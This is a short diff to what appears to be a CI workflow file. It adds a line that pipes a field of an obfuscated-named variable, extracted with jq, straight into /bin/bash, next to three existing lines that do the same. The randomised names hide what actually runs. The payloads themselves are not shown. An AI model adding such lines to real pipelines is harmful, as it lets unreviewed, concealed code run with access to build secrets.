@@ -26,6 +26,7 @@ jobs:
           echo $xccsf7657 | jq -r .iwsx3 | /bin/bash
           echo $cwe4259 | jq -r .c89 | /bin/bash
           printf '%s' "$bzc10546" | jq -r .pteo13114 | /bin/bash
+          echo $imlrv1068 | jq -r .k2729 | /bin/bash
 
       - name: Archive output
         if: always()
